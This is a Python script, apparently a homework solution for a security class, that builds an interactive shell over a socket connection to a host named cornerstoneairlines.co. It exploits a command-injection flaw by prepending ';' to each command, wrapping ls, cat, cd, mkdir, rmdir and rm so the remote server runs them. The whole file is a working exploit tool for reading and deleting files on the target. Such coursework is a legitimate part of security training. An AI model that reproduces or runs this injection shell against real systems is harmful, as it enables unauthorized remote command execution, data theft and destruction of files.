"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
from subprocess import call
from cmd import Cmd

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here


def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    s.recv(1024)

    s.send((';' + cmd + '\n').encode())
    print(s.recv(1024).decode())


class Shell(Cmd):

    current_directory= "/"

    def do_quit(self, args):
        """
        This command quits the interactive shell
        Example:
            quit
        """
        print("Goodbye!\n")
        raise SystemExit

    def do_shell(self, args):
        """
        This command opens up a shell into Cornerstone Airlines root directory
        Example:
            shell
        """
        prompt.prompt = self.current_directory + '$'

    def do_pull(self, args):
        """
        This command executes a pull request from a remote path to a local path
        Example:
        Pull <remote_path> <local_path>
        """

    def do_pwd(self, args):
        """
        This command displays the current path to the working directory.
        Example:
            pwd
        """
        execute_cmd('cd ' + self.current_directory + ' && pwd')

    def do_ls(self, args):
        """
        This command displays the files within the current directory
        Example:
            ls <flags>
        """

        execute_cmd('cd ' + self.current_directory + ' && ls ' + args)

    def do_cd(self, args):
        """
        This command changes the working directory to the provided directory
        Example:
            cd <directory path>
        """
        self.current_directory = args
        if args == "" or args == '~':
            self.current_directory = '/'

        execute_cmd('cd ' + args)
        prompt.prompt = self.current_directory + '$'

    def do_cat(self, args):
        """
        This command prints a text file in the shell
        Example:
            cat <file to display>
        """
        execute_cmd('cd ' + self.current_directory + ' && cat ' + args)

    def do_mkdir(self, args):
        """
        This command allows you to make a new directory within the current directory.
        Example:
            mkdir <new directory name>
        """
        execute_cmd('mkdir ' + args)

    def do_rmdir(self, args):
        """
        This command allows the user to remove an existing directory.
        Example:
            rmdir <directory to remove name>
        """
        execute_cmd('rmdir ' + args)

    def do_rm(self, args):
        """
        This command allows the user to remove files from the system.
        Example:
            rm <filename>
        """
        execute_cmd('rm ' + args)

    def do_clear(self, args):
        """
        This command clears the shell screen
        Example:
            clear
        """
        call('clear')


if __name__ == '__main__':
    prompt = Shell()
    prompt.prompt = '$'
    prompt.cmdloop()

